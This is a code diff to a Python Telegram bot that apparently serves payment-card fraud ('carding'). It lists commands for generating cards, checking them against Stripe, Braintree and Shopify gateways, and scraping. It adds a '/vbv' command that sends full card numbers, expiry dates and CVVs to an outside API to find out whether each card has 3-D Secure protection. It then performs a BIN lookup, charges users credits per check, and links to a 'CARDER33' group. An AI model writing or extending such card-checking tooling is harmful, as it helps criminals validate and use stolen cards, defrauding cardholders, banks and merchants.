@@ -229,6 +229,7 @@ BOT_COMMANDS = [
     "/start", "/cmds", "/gen", "/bin", "/chk", "/mchk", "/mass",
     "/mtchk", "/fk", "/fl", "/open", "/status", "/credits", "/info"
     "/scr", "/sh", "/seturl", "/sp", "scr", "/remove", "/b3" "/site"
+    "/vbv", "/mvbv",
 ]
 
 from telegram.ext import ApplicationHandlerStop
@@ -261,6 +262,7 @@ BOT_COMMANDS = [
     "start", "cmds", "gen", "bin", "chk", "mchk", "mass",
     "mtchk", "fk", "fl", "open", "status", "credits", "info"
     "scr", "sh", "seturl", "sp", "scr", "remove", "b3", "site"
+    "vbv", "mvbv"
 ]
 
 from telegram.ext import ApplicationHandlerStop, filters
@@ -444,7 +446,8 @@ def get_main_keyboard() -> InlineKeyboardMarkup:
             InlineKeyboardButton("⚡ 𝐒𝐜𝐫𝐚𝐩𝐩𝐞𝐫", callback_data="scrapper_menu"),
             InlineKeyboardButton("💎 Owner", url=DEV_LINK)
         ],
-        [InlineKeyboardButton("👥 Official Group", url=OFFICIAL_GROUP_LINK)]
+        [InlineKeyboardButton("👥 Official Group", url=OFFICIAL_GROUP_LINK)],
+        [InlineKeyboardButton("🔐 3DS Lookup", callback_data="ds_lookup")]
     ])
 
 async def build_start_message(user, context) -> tuple[str, InlineKeyboardMarkup]:
@@ -528,6 +531,7 @@ async def show_tools_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{bullet_link} `/cmds` – Shows all commands\n"
         f"{bullet_link} `/gen` `[bin]` `[no\\. of cards]` – Generate cards\n"
         f"{bullet_link} `/bin` `<bin>` – BIN lookup\n"
+        f"{bullet_link} `/vbv` –  3DS Lookup\n"
         f"{bullet_link} `/b3` `cc\\|mm\\|yy\\|cvv` – Braintree Premium Auth\n"
         f"{bullet_link} `/chk` `cc\\|mm\\|yy\\|cvv` – Stripe Auth\n"
         f"{bullet_link} `/mchk` –  Multi Stripe\n"
@@ -756,6 +760,33 @@ async def scrapper_menu_handler(update: Update, context: ContextTypes.DEFAULT_TY
         reply_markup=InlineKeyboardMarkup(keyboard),
     )
 
+
+
+async def ds_lookup_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Callback handler for the '3DS Lookup' button."""
+    q = update.callback_query
+    await q.answer()
+    text = (
+        "✦━━━━━━━━━━━━━━✦\n"
+        "   🔐 𝟑𝐃𝐒 𝐋𝐨𝐨𝐤𝐮𝐩\n"
+        "✦━━━━━━━━━━━━━━✦\n\n"
+        "• `/vbv` `<card|mm|yy|cvv>`\n"
+        "  Example:\n"
+        "  `/vbv 4111111111111111|12|2026|123`\n\n"
+        "👉 Checks whether the card is *VBV (Verified by Visa)* or *NON-VBV*\\.\n"
+        "⚠️ Ensure you enter the card details in the correct format\\.\n\n"
+        "✨ 𝗦𝘁𝗮𝘁𝘂𝘀 \\- 𝑨𝒄𝒕𝒊𝒗𝒆 ✅"
+    )
+    keyboard = [
+        [InlineKeyboardButton("◀️ 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨", callback_data="back_to_start")]
+    ]
+    await q.edit_message_caption(
+        text,
+        parse_mode=ParseMode.MARKDOWN_V2,
+        reply_markup=InlineKeyboardMarkup(keyboard),
+    )
+
+
 async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     Handles all inline button callback queries and routes them to the
@@ -764,6 +795,7 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     await q.answer()
     data = q.data
+
     if data == "tools_menu":
         await show_tools_menu(update, context)
     elif data == "gates_menu":
@@ -782,10 +814,13 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await braintree_examples_handler(update, context)
     elif data == "scrapper_menu":
         await scrapper_menu_handler(update, context)
+    elif data == "ds_lookup":
+        await ds_lookup_menu_handler(update, context)
     elif data == "back_to_start":
         await back_to_start_handler(update, context)
     else:
         await q.answer("⚠️ Unknown option selected.", show_alert=True)
+
 
 
 
@@ -820,6 +855,7 @@ async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
        "🔹 *𝘽𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲*\n"
         f"{bullet_link} `/b3 cc\\|mm\\|yy\\|cvv` – Braintree Premium Auth\n"
+        f"{bullet_link} `/vbv cc\\|mm\\|yy\\|cvv` – 3DS Lookup\n"
 
         "🔹 *𝙎𝙝𝙤𝙥𝙞𝙛𝙮*\n"
         f"{bullet_link} `/sh` – Shopify Charge \\$5\n"
@@ -3797,6 +3833,138 @@ async def b3_command(update, context):
     asyncio.create_task(process_b3(update, context, card_input, status_msg))
 
 
+import aiohttp
+import logging
+from telegram import Update
+from telegram.ext import CommandHandler, ContextTypes
+
+from db import get_user, update_user  # your db functions
+
+logger = logging.getLogger(__name__)
+
+# --- Config ---
+BULLET_GROUP_LINK = "https://t.me/CARDER33"
+bullet_text = "[⌇]"
+bullet_link = f'<a href="{BULLET_GROUP_LINK}">{bullet_text}</a>'
+
+DEVELOPER_NAME = "kคli liຖนxx"
+DEVELOPER_LINK = "https://t.me/Kalinuxxx"
+developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
+
+
+# --- Credit System ---
+async def consume_credit(user_id: int) -> bool:
+    try:
+        user_data = await get_user(user_id)
+        if user_data and user_data.get("credits", 0) > 0:
+            new_credits = user_data["credits"] - 1
+            await update_user(user_id, credits=new_credits)
+            return True
+    except Exception as e:
+        print(f"[consume_credit] Error updating user {user_id}: {e}")
+
+    return False
+
+
+# --- BIN Lookup ---
+async def get_bin_details(bin_number: str) -> dict:
+    bin_data = {
+        "scheme": "N/A",
+        "bank": "N/A",
+        "country_name": "N/A",
+        "country_emoji": ""
+    }
+    url = f"https://bins.antipublic.cc/bins/{bin_number}"
+    headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, headers=headers, timeout=7) as response:
+                if response.status == 200:
+                    try:
+                        data = await response.json(content_type=None)
+                        bin_data["scheme"] = str(data.get("brand", "N/A")).upper()
+                        bin_data["bank"] = str(data.get("bank", "N/A")).title()
+                        bin_data["country_name"] = data.get("country_name", "N/A")
+                        bin_data["country_emoji"] = data.get("country_flag", "")
+                        return bin_data
+                    except Exception as e:
+                        logger.warning(f"JSON parse error for BIN {bin_number}: {e}")
+                else:
+                    logger.warning(f"BIN API returned {response.status} for BIN {bin_number}")
+    except Exception as e:
+        logger.warning(f"BIN API call failed for {bin_number}: {e}")
+
+    return bin_data
+
+
+# --- /vbv command handler ---
+async def vbv(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+
+    # Check credits first
+    if not await consume_credit(user_id):
+        await update.message.reply_text("❌ You don’t have enough credits to use /vbv.")
+        return
+
+    if not context.args:
+        await update.message.reply_text("⚠️ Usage: /vbv <card|mm|yyyy|cvv>")
+        return
+
+    card_data = context.args[0]  # full card input
+    msg = await update.message.reply_text("⏳ <b>Processing...</b>", parse_mode="HTML")
+
+    # Run the actual check in background so bot stays free
+    asyncio.create_task(run_vbv_check(msg, update, card_data))
+
+
+async def run_vbv_check(msg, update, card_data: str):
+    try:
+        cc, mes, ano, cvv = card_data.split("|")
+    except:
+        await msg.edit_text("❌ Invalid format. Use: /vbv 4111111111111111|07|2027|123")
+        return
+
+    # Call VBV API
+    api_url = f"https://rocky-815m.onrender.com/gateway=bin?key=Payal&card={card_data}"
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.get(api_url, timeout=15) as resp:
+                if resp.status != 200:
+                    await msg.edit_text("❌ API Error. Try again later.")
+                    return
+                vbv_data = await resp.json(content_type=None)
+        except Exception as e:
+            await msg.edit_text(f"❌ API request failed: {e}")
+            return
+
+    # BIN lookup
+    bin_number = cc[:6]
+    bin_details = await get_bin_details(bin_number)
+    brand = bin_details.get("scheme", "N/A")
+    issuer = bin_details.get("bank", "N/A")
+    country_name = bin_details.get("country_name", "N/A")
+    country_flag = bin_details.get("country_emoji", "")
+
+    # Response formatting
+    response_text = vbv_data.get("response", "N/A")
+    check_mark = "✅" if response_text in ["Authenticate Attempt Successful", "Authenticate Successful"] else "❌"
+
+    text = (
+        "═══[ #𝟯𝗗𝗦 𝗟𝗼𝗼𝗸𝘂𝗽 ]═══\n"
+        f"{bullet_link} 𝐂𝐚𝐫𝐝 ➜ <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
+        f"{bullet_link} BIN ➜ <code>{bin_number}</code>\n"
+        f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ <i>{response_text} {check_mark}</i>\n"
+        "――――――――――――――――\n"
+        f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➜ <code>{brand}</code>\n"
+        f"{bullet_link} 𝐁𝐚𝐧𝐤 ➜ <code>{issuer}</code>\n"
+        f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ <code>{country_name} {country_flag}</code>\n"
+        "――――――――――――――――\n"
+        f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {update.effective_user.mention_html()}\n"
+        f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ {developer_clickable}"
+    )
+
+    await msg.edit_text(text, parse_mode="HTML")
 
 
 
@@ -4454,6 +4622,7 @@ def main():
     application.add_handler(CommandHandler("fk", command_with_check(fk_command, "fk")))
     application.add_handler(CommandHandler("scr", command_with_check(scrap_command, "scr")))
     application.add_handler(CommandHandler("b3", b3_command))
+    application.add_handler(CommandHandler("vbv", vbv))
     application.add_handler(CommandHandler("fl", command_with_check(fl_command, "fl")))
     application.add_handler(CommandHandler("status", command_with_check(status_command, "status")))
     application.add_handler(CommandHandler("redeem", command_with_check(redeem_command, "redeem")))
